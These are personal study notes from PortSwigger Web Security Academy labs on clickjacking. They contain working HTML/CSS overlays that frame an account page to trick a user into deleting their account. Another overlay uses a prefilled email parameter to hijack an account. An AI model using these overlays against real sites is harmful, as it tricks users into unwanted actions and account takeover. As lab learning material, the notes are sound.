An interface-based attack, where the user is tricked into clicking on actionable content on a **hidden/embedded website** by overlaying the intended/benign site, Often incorporated via an `<iframe>` and multiple layers using `CSS`.
- Sent a link to victim, containing decoy site
- Decoy site uses an `<iframe>` to **load the target website *over* malicious content** on the decoy site

**Important:** CSRF tokens ***do not project against clickjacking*** - as the **target session is established with ALL content loaded from the target site** (CSRF token included).

Can use [Clickbandit](https://portswigger.net/burp/documentation/desktop/tools/clickbandit) to generate #clickjacking attacks. Allows you to **perform the desired actions on the frameable page**, then **creates an HTML file containing a suitable clickjacking overlay**. Via `Burp` --> `Clickbandit`.
![](attachments/ClickJacking.png)

**Example: (manual framing)**
``` html
<head>
	<style>
		#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			top:300px;
			left:400px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
```
- Adjust **absolute & relative position values so** there's **a precise overlap of the target action** with the decoy website
- `z-index` determines stacking order of `<iframe>` & website layers
- `opacity:0.00001` so `<iframe>` content is transparent to users.
	- **May need to adjust this - as some browsers perform threshold-based `<iframe>` transparency detection (e.g. Chrome)**


##### Lab: [Basic clickjacking with CSRF token protection](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected)
**Objective:** *This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.*
*To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.*
*You can log in to your own account using the following credentials: `wiener:peter`*

When loading `/my-account`, notice we can delete our account with no confirmation, by clicking the button.
![](attachments/Pasted%20image%2020260622125438.png)

Using the below code on our exploit server, adjust the `top` and `left` parameters to move the `Test me here!` `<div>` to overlap where roughly where the `Delete account` button would be when the account page is loaded. **ENSURE YOU DO NOT ACTUALLY DELETE YOUR OWN ACCOUNT AS THIS WILL BREAK THE LAB FOR ~20MIN REGARDLESS OF WHETHER YOU HAVE THE RIGHT CODE**.
Have adjusted the target site being loaded underneath to be semi-transparent while testing, but change to `0.0001` when delivering to victim.
``` html
<head>
	<style>
		#target_website {
			position:relative;
			width:700px;
			height:500px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			top:300px;
			left:60px;
			z-index:1;
			}
	</style>
</head>
<body>
	<div id="decoy_website">
	Click me here!
	</div>
	<iframe id="target_website" src="https://0a880020044cac94803f531200a500a6.web-security-academy.net/my-account"></iframe>
</body>

// or

<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:520px;
        left:50px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a880020044cac94803f531200a500a6.web-security-academy.net/my-account"></iframe>

```
![](attachments/Pasted%20image%2020260622125227.png)
==to do when lab resets==


### Clickjacking with prefilled form input
When websites requir



Using pre-filled URL parameters:
`GET /my-account?id=wiener&email=test@email.com` --> pre-fills form with attacker's email so clickjack only needs to click submit (gets around having to submit a `POST` request to change email)
![](attachments/Pasted%20image%2020260622143513.png)

``` html
<style>
    iframe {
        position:relative;
        width:700px;
        height: 600px;
        opacity: 0.5;
        z-index: 2;
    }
    div {
        position:absolute;
        top:480px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0acc0052038c393080525899004c0052.web-security-academy.net/my-account?email=evil@attacker.com"></iframe>
```

![](attachments/Pasted%20image%2020260622143825.png)